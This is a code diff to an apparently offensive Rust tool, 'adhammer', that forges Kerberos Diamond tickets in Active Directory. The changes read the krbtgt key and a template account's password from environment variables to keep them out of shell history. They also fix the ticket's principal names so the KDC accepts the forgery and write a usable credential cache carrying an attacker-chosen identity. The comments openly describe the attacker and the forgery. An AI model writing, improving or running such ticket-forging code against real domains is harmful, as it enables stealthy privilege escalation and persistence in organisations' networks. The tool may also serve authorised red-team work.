@@ -30,10 +30,14 @@ pub(crate) struct DiamondArgs {
     /// clock-domain fields, not the account's privileges.
     #[arg(long)]
     pub template_user: String,
-    /// Legitimate account's password (or NT hash with `--template-hash`).
+    /// Legitimate account's password (or NT hash with `--template-hash`). Supports
+    /// `env:VAR` to read from an environment variable so the value never appears
+    /// in `ps` / shell history.
     #[arg(long)]
     pub template_password: String,
     /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with `--rc4`.
+    /// Supports `env:VAR` to read from an environment variable so the value never
+    /// appears in `ps` / shell history.
     #[arg(long)]
     pub krbtgt_aes256: String,
     /// Forge an RC4-HMAC (etype 23) ticket — interpret the krbtgt key as the NT hash (legacy DCs).
@@ -62,7 +66,10 @@ pub(crate) struct DiamondArgs {
     pub verify_spn: Option<String>,
 }
 
-pub(crate) async fn diamond(a: DiamondArgs) -> Result<()> {
+pub(crate) async fn diamond(mut a: DiamondArgs) -> Result<()> {
+    a.template_password =
+        crate::resolve_secret(&a.template_password, "ADHAMMER_TEMPLATE_PASSWORD")?;
+    a.krbtgt_aes256 = crate::resolve_secret(&a.krbtgt_aes256, "ADHAMMER_KRBTGT_AES256")?;
     let mut checklist = ui::StageChecklist::new([
         "parse krbtgt key + SIDs",
         "acquire real TGT (template)",
@@ -167,7 +174,12 @@ async fn diamond_impl(a: DiamondArgs, checklist: &mut ui::StageChecklist) -> Res
     );
 
     if let Some(spn) = &a.verify_spn {
-        match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
+        // Authenticator's cname MUST match the ticket's inner cname. The Diamond
+        // ticket's outer cname is inherited from the template TGT (see the
+        // `cname_template` inheritance in forge_diamond_tgt), so we pass
+        // `template_user` — not `user` — to roast_spn's label parameter for
+        // consistency with the on-the-wire authenticator.
+        match adhammer_kerberos::roast_spn(&tgt, &a.template_user, spn, &a.kdc).await {
             Ok(_) => {
                 checklist.record_ok(
                     "verify with KDC (--verify-spn)",
@@ -176,11 +188,18 @@ async fn diamond_impl(a: DiamondArgs, checklist: &mut ui::StageChecklist) -> Res
                 println!("[+] KDC accepted the diamond ticket (TGS-REP for {spn})");
             }
             Err(e) => {
-                checklist.record_ok(
-                    "verify with KDC (--verify-spn)",
-                    format!("KDC rejected for {spn}: {e}"),
-                );
-                println!("[-] KDC rejected the diamond ticket for {spn}: {e}");
+                // KDC rejected. Propagate as Err so the exit code is non-zero — the
+                // whole point of --verify-spn is to fail loud when the KDC does not
+                // accept our forgery, so the operator's downstream automation sees it.
+                let brief = format!("{e:#}")
+                    .lines()
+                    .next()
+                    .unwrap_or("KDC rejected")
+                    .chars()
+                    .take(80)
+                    .collect::<String>();
+                checklist.mark_current_failed(brief.clone());
+                anyhow::bail!("KDC rejected the diamond ticket for {spn}: {e}");
             }
         }
     } else {
@@ -190,12 +209,22 @@ async fn diamond_impl(a: DiamondArgs, checklist: &mut ui::StageChecklist) -> Res
         );
     }
     if let Some(out) = &a.out {
-        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
+        // ccache header principal must match the ticket's inner cname (which
+        // for Diamond is the template's, not the attacker's — see
+        // forge_diamond_tgt's `cname_template` handling). Passing the
+        // attacker's sAMAccountName here would give the ccache a header
+        // principal that mismatches every credential entry inside it and
+        // downstream `klist`/GSSAPI would either warn or refuse to use it.
+        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.template_user)?;
         std::fs::write(out, &cc)?;
         checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
         println!(
             "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
             cc.len()
+        );
+        println!(
+            "[i] ccache header cname = {} (template), PAC identity = {} (attacker-chosen)",
+            a.template_user, a.user
         );
     } else {
         checklist.record_ok("write ccache", "skipped (no --out)");
